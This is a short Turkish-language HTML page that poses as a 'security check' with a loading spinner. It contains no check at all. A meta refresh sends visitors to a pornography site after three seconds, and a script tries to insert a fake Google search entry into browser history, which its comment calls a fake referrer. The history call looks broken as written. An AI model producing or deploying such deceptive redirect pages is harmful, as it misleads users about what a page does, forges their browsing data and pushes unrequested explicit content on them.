<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Güvenlik Kontrolü</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="3;URL=https://turkpornovideolari.com">
  <style>
    body {
      background-color: #111;
      color: #eee;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .spinner {
      border: 6px solid #444;
      border-top: 6px solid #4caf50;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .text {
      text-align: center;
      max-width: 400px;
      font-size: 18px;
    }
  </style>

  <script>
    // Tarayıcı geçmişine sahte Google referrer ekle
    history.pushState({}, '', 'https://www.google.com/search?q=porno');
  </script>
</head>
<body>
  <div class="spinner"></div>
  <div class="text">
    <p>Güvenlik kontrolü yapılıyor...</p>
    <p>Lütfen bekleyin, yönlendiriliyorsunuz.</p>
  </div>
</body>
</html>
